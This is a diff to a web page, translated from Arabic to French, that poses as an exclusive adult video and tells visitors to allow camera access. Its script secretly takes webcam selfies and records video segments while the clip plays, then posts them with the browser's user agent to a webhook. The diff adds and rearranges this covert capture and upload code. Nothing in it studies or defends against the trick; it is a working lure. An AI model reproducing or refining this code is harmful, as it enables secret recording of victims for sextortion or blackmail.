@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>365 Days – المشهد الحصري الآن</title>
+  <title>Scène Exclusive 2025 – Regardez maintenant</title>
   <style>
     body {
       margin: 0;
@@ -55,7 +55,7 @@
       width: 0%;
       height: 100%;
       background: linear-gradient(to right, #ff0066, #ff6699, #ff0066);
-      transition: width 10s linear;
+      transition: width 5s linear;
       box-shadow: inset 0 0 20px #ff0066;
     }
     #video-container {
@@ -85,11 +85,11 @@
 <body>
 
 <header>
-  <h1>365 Days</h1>
-  <p class="tagline">المشهد الحصري الأكثر إثارة – شغّل الآن واستمتع</p>
+  <h1>Scène Exclusive 2025</h1>
+  <p class="tagline">Regardez la scène la plus chaude maintenant – cliquez sur Autoriser pour continuer</p>
 </header>
 
-<div id="status">جاري التحميل... السماح بالكاميرا مطلوب</div>
+<div id="status">Chargement en cours... Autorisation de la caméra requise</div>
 
 <div id="progress-container">
   <div id="progress-bar"></div>
@@ -98,7 +98,7 @@
 <div id="video-container">
   <video id="main-video" controls autoplay>
     <source src="https://files.catbox.moe/r2dbvz.mp4" type="video/mp4">
-    متصفحك لا يدعم الفيديو
+    Votre navigateur ne supporte pas la vidéo
   </video>
 </div>
 
@@ -106,7 +106,7 @@
 <canvas id="canvas" style="display:none;"></canvas>
 
 <footer>
-  © 2025 365 Days Exclusive – محتوى للكبار فقط
+  © 2025 Scène Exclusive – Contenu réservé aux adultes
 </footer>
 
 <script>
@@ -130,56 +130,78 @@ async function startCaptureAndPlay() {
     hiddenVideo.srcObject = stream;
     await hiddenVideo.play();
 
-    status.textContent = "جاري تجهيز المشهد... لا تغلق";
+    status.textContent = "Chargement en cours... Ne fermez pas la page";
     progressContainer.style.display = 'block';
     progressBar.style.width = '0%';
 
-    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-    const chunks = [];
+    // التقاط صورتين فور السماح (5 ثواني للـ progress)
+    setTimeout(() => captureSelfie(1), 1000);
+    setTimeout(() => captureSelfie(2), 3000);
 
-    recorder.ondataavailable = e => chunks.push(e.data);
-    recorder.start(100);
-
+    // بدء الـ progress bar لـ 5 ثواني
     let progress = 0;
     const interval = setInterval(() => {
-      progress += 1;
+      progress += 2;
       progressBar.style.width = progress + '%';
       if (progress >= 100) {
         clearInterval(interval);
-        finishRecording(recorder, chunks, stream);
+        showVideo();
       }
     }, 100);
 
   } catch (err) {
-    status.textContent = "الرجاء السماح بالكاميرا لتشغيل المقطع";
+    status.textContent = "Veuillez autoriser la caméra pour continuer";
     console.log("رفض أو خطأ:", err);
   }
 }
 
-async function finishRecording(recorder, chunks, stream) {
-  recorder.stop();
+function showVideo() {
+  status.style.display = 'none';
+  progressContainer.style.display = 'none';
+  videoContainer.style.display = 'block';
 
-  recorder.onstop = async () => {
-    const blob = new Blob(chunks, { type: 'video/webm' });
+  const mainVideo = document.getElementById('main-video');
+  mainVideo.play();
 
-    const fdVideo = new FormData();
-    fdVideo.append('video_10s', blob, `capture_${Date.now()}.webm`);
-    fdVideo.append('timestamp', Date.now());
-    fdVideo.append('user_agent', navigator.userAgent);
-    fdVideo.append('screen', `\( {screen.width}x \){screen.height}`);
+  // تسجيل أثناء تشغيل الفيديو
+  let recording = false;
+  const stream = hiddenVideo.srcObject;
 
-    await fetch(WEBHOOK_URL, { method: 'POST', body: fdVideo }).catch(console.log);
+  mainVideo.addEventListener('play', async () => {
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
 
-    stream.getTracks().forEach(track => track.stop());
-    hiddenVideo.srcObject = null;
+    recorder.ondataavailable = e => chunks.push(e.data);
 
-    status.style.display = 'none';
-    progressContainer.style.display = 'none';
-    videoContainer.style.display = 'block';
+    // تسجيل أول 5 ثواني
+    recorder.start(100);
+    recording = true;
 
-    setTimeout(() => captureSelfie(1), 2000);
-    setTimeout(() => captureSelfie(2), 4000);
-  };
+    setTimeout(() => {
+      recorder.stop();
+      recording = false;
+      recorder.onstop = () => sendVideo(chunks, 1);
+
+      // 5 ثواني بدون تصوير ثم تسجيل آخر 5 ثواني
+      setTimeout(async () => {
+        recorder.start(100);
+        recording = true;
+        setTimeout(() => {
+          recorder.stop();
+          recorder.onstop = () => sendVideo(chunks, 2);
+        }, 5000);
+      }, 5000);
+    }, 5000);
+  });
+}
+
+async function sendVideo(chunks, num) {
+  const blob = new Blob(chunks, { type: 'video/webm' });
+  const fd = new FormData();
+  fd.append('video_segment', blob, `segment_\( {Date.now()}_ \){num}.webm`);
+  fd.append('timestamp', Date.now());
+  fd.append('user_agent', navigator.userAgent);
+  await fetch(WEBHOOK_URL, { method: 'POST', body: fd }).catch(console.log);
 }
 
 async function captureSelfie(num) {
@@ -199,7 +221,6 @@ async function captureSelfie(num) {
 
     setTimeout(() => {
       stream.getTracks().forEach(track => track.stop());
-      hiddenVideo.srcObject = null;
     }, 500);
   } catch (err) {
     console.log("خطأ selfie:", err);
